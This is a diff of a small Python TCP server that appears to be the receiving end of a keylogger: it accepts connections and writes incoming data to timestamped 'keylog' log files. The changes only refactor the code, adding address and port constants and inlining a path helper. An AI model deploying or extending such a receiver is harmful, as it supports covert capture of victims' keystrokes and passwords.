@@ -5,6 +5,9 @@ import sys
 import threading
 import time
 
+SERVER_ADDRESS = "127.0.0.1"
+SERVER_PORT = 10000
+
 
 def logger(prefix: str, message: str) -> None:
     log_string = (
@@ -28,13 +31,12 @@ class Client(threading.Thread):
         self.conn = conn
         self.timestamp = int(time.time())
 
-    @staticmethod
-    def localise_path(path: str) -> str:
-        return os.path.join(os.path.dirname(os.path.realpath(__file__)), path)
-
     def run(self) -> None:
-        log_file = self.localise_path(f"data\\logs\\keylog_{self.timestamp}.log")
-        with open(log_file, mode="wb+", buffering=0) as log:
+        log_path = os.path.join(
+            os.path.dirname(os.path.realpath(__file__)),
+            f"data\\logs\\keylog_{self.timestamp}.log",
+        )
+        with open(log_path, mode="wb+", buffering=0) as log:
             log.write(
                 bytes(
                     "Client connected from {}:{}\n\n".format(*self.conn.getpeername()),
@@ -58,18 +60,18 @@ class Client(threading.Thread):
 
 
 def main(host: str, port: int) -> None:
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as ls:
-        ls.bind((host, port))
-        ls.listen()
-        logger("INFO", "Listening on {}:{}".format(*ls.getsockname()))
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.bind((host, port))
+        sock.listen()
+        logger("INFO", "Listening on {}:{}".format(*sock.getsockname()))
         while True:
-            conn, _ = ls.accept()
+            conn, _ = sock.accept()
             logger("INFO", "Connection from {}:{}".format(*conn.getpeername()))
             Client(conn).start()
 
 
 if __name__ == "__main__":
     try:
-        main("127.0.0.1", 6000)
+        main(SERVER_ADDRESS, SERVER_PORT)
     except AttributeError as error:
         logger("ERROR", error)
